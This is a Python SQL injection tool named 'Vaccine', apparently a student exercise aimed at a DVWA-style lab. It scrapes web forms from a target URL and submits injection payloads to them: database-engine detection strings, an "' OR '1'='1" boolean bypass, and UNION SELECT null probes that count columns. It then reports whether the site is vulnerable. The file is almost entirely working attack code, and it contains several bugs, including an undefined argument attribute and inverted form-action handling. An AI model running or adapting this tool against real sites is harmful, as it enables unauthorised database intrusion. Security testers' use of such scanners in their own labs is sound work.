import requests
import argparse     
import shutil 
import os
from bs4 import BeautifulSoup

PHP_SESSID={"PHPSESSID":"p4gjldgt6r1mi076g8qnqfup83", "security":"low"}

mysql_detect = "1' or conv('a',16,2)=conv('a',16,2) #"
postgres_detect = "5::int=5 #"

errors = {
    "you have an error in your sql syntax",
}

union_errors = {
    "the used select statements have a different number of columns",
}

failed_injection = []
good_injection = []
data_output = []

def do_injection(url, form, injection, methods):
    form_methods = form.get("method")
    if (form_methods != methods):
        return ;
    inputs = form.find_all("input")
    data = {}
    for _input in inputs:
        value =  _input.get("value")
        if (value != "Submit"):
            value = injection
        data[_input.get("name")] = value
    
    action = form.get('action')
    url_to_pwn = ""
    if (action != "#"):
        url_to_pwn = url
    else:
        url_to_pwn = url + action
        
    res = None
    if (methods == "GET"):
        res = requests.get(url_to_pwn, data, cookies=PHP_SESSID)
    else:
        res = requests.post(url_to_pwn, json=data, cookies=PHP_SESSID)
    return res

def detect_errors(res):
    for error in errors:
        if (error in res.content.decode().lower()):
            return True
    return False

def detect_errors_column(res):
    for error in union_errors:
        if (error in res.content.decode().lower()):
            return True
    return False

class Engine:
    injection_boolean = ["\' OR '1'='1 -- "]
    injection_query_columns = [
        "' UNION SELECT null -- ",
        "' UNION SELECT null,null -- ",
        "' UNION SELECT null,null,null -- ",
        "' UNION SELECT null,null,null,null -- ",
        "' UNION SELECT null,null,null,null,null -- ",
        "' UNION SELECT null,null,null,null,null,null -- ",
        "' UNION SELECT null,null,null,null,null,null,null -- ",
    ]
    methods = ""
    query_columns = 0

    def __init__(self, methods):
        self.methods = methods

    def make_test_boolean(self, url, form):
        for injection in self.injection_boolean:
            res = do_injection(url, form, injection, self.methods)
            if (detect_errors(res)):
                print("Injection", injection, ": FAILED")
                failed_injection.append("Injection" + injection + ": FAILED")
            else:
                print("Injection", injection, ": OK")
                good_injection.append("Injection" + injection + ": OK")

    def make_test_get_columns(self, url, form):
        i = 1;
        for injection in self.injection_query_columns:
            res = do_injection(url, form, injection, self.methods)
            print("Checking column number:", i)
            if (not detect_errors_column(res)):
                print("Number of column found:", i)
                good_injection.append("Number of columns returned: " + str(i))
                return i;
            i += 1

    def make_test(self, url, form):
        print("Testing MYSQL...")
        print("Boolean query...")
        self.make_test_boolean(url, form)
        print("Getting column number...")
        self.query_columns = self.make_test_get_columns(url, form)
        print("Testing finished, website is", "vulnerable" if self.query_columns > 0 else "nicely protected")
        if (self.query_columns == 0):
            exit(1);

class Vaccine:
    output_file = "output"
    methods = "GET"
    url = ""
    forms = []
    engine = ""

    def __init__(self, args):
        if (args.output is not None):
            self.output_file = args.output_file
        if (args.methods is not None):
            self.methods = args.methods
        if (args.URL is not None):
            self.url = args.URL

    def write_injection(self):
        if (not os.path.exists("output/")):
            os.makedirs("output/")
        with open("output/" + self.output_file, "w+") as f:
            for line in good_injection:
                f.write(line + "\n")
            for line in failed_injection:
                f.write(line + "\n")
        shutil.make_archive(self.output_file, 'zip', "output")
        os.remove("output/" + self.output_file)
        os.rmdir("output/")
    
    def find_form(self):
        try:
            html_doc = requests.get(self.url, cookies=PHP_SESSID)
            soup = BeautifulSoup(html_doc.content, 'html.parser')
            self.forms = soup.find_all("form");
            if (len(self.forms) == 0):
                print("No form found")
                exit(1)
        except:
            print("URL not valid")
            exit(1)

    def inject(self):
        for form in self.forms:
            engine = Engine(self.methods)
            engine.make_test(self.url, form)
            

    def detect_engine(self):
        for form in self.forms:
            methods = form.get("method")
            if methods != self.methods:
                continue ;
            res = do_injection(self.url, form, mysql_detect, self.methods)
            if (not detect_errors(res)):
                self.engine = "MySql"
                break ;
            res = do_injection(self.url, form, postgres_detect, self.methods)
            if (not detect_errors(res)):
                self.engine = "Postgres"
                break ;
        if (self.engine == ""):
            print("Error: No engine found")
            exit(1);
        print("Engine found:", self.engine)        

def init_args():
    parser = argparse.ArgumentParser(
                    prog='Vaccine',
                    description='A program that can perform SQL injection to test the vulnerability of an endpoint',
                    epilog='Made with <3 by hrecolet')
    parser.add_argument('URL')
    parser.add_argument('-o', '--output', type=str)
    parser.add_argument('-X', '--methods',type=str)
    args = parser.parse_args()
    return args

def exec():
    args = init_args()
    vaccine = Vaccine(args)
    vaccine.find_form()
    vaccine.detect_engine()
    vaccine.inject()
    vaccine.write_injection()

if __name__ == '__main__':
    exec()